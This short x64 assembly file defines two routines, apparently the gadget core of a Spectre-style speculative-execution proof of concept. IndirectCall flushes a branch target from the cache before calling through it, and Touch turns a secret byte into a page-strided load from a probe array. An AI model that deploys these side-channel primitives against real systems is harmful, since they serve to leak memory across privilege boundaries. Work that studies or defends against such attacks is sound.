global IndirectCall
global Touch

section .text

IndirectCall:
  mov rax, rcx
  mov rcx, rdx
  mov rdx, r8
  clflush [rax]
  call [rax]
  ret

Touch:
  movzx eax, byte [rcx]
  shl rax, 0Ch
  mov al, byte [rax+rdx]
  sysenter
